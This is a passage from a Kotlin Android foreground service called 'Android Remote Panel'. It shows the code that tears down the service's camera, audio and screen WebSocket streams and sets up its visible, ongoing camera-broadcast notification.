        } catch (e: Exception) {
            if (!frameErrorReported) {
                frameErrorReported = true
                sendCamStatus("Ошибка кадра: ${e.message?.take(50) ?: e.javaClass.simpleName}")
            }
        } finally {
            proxy.close()
        }
    }

    // ── Lifecycle ──────────────────────────────────────────────────────────

    private fun disconnect() {
        cameraProvider?.unbindAll(); cameraProvider = null
        wsBack?.close(1000, "stop");   wsBack = null
        wsFront?.close(1000, "stop");  wsFront = null
        wsAudio?.close(1000, "stop");  wsAudio = null
        wsScreen?.close(1000, "stop"); wsScreen = null
        wsPhone?.close(1000, "stop");  wsPhone = null
        stopAudioCapture()
        releaseVirtualDisplay()
        mediaProjection?.stop(); mediaProjection = null
        hasProjection = false
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        disconnect()
        lifecycleOwner.stop()
        analyzerExecutor.shutdown()
        wakeLock?.release()
    }

    override fun onBind(intent: Intent?) = null

    private fun createNotificationChannel() {
        val ch = NotificationChannel(CHANNEL_ID, "Трансляция камеры", NotificationManager.IMPORTANCE_LOW)
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun buildNotification(text: String): Notification {
        val pi = PendingIntent.getActivity(this, 0,
            Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE)
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Android Remote Panel")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentIntent(pi)
            .setOngoing(true)
            .build()
    }

    private fun updateNotification(text: String) {
        statusText = text
        getSystemService(NotificationManager::class.java).notify(NOTIF_ID, buildNotification(text))
    }
}

class StreamingLifecycleOwner : LifecycleOwner {
    private val registry = LifecycleRegistry(this)
    override val lifecycle: Lifecycle get() = registry
    fun start() {
        Handler(Looper.getMainLooper()).post {
            registry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
            registry.handleLifecycleEvent(Lifecycle.Event.ON_START)
            registry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)
        }
    }
    fun stop() {
        Handler(Looper.getMainLooper()).post {
            registry.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
            registry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
            registry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
        }
    }
}
